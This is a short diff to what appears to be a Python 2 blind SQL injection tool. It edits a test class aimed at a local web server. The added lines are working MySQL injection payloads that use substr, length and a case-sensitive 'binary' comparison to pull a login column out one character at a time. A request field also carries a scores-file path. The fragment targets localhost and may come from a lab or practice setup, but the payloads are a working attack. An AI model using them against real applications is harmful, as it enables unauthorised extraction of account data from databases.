@@ -169,10 +169,14 @@ class SQLILeaker(Leaker):
         print 'value: %s' % ''.join(self.values)
 
 class SQLITest(SQLILeaker):
+    '''
+    MySQL make string comparison case insensitive, you have to use
+    the keyword binary
+    '''
     url    = 'http://localhost:8080'
     method = 'post'
-    query  = ' OR id=1 and substr(passwd,%d,1)>=char(%d)#'
-    query_length = ' OR id=1 and length(passwd)>=%d#'
+    query  = ' OR id=3 and substr(login,%d,1)>=binary char(%d)#'
+    query_length = ' OR id=3 and length(login)>=binary %d#'
     data = {'login': None, 'pass': '/var/games/gnibbles.1.1.scores'}
     parser = SQLIBlindParser()
 
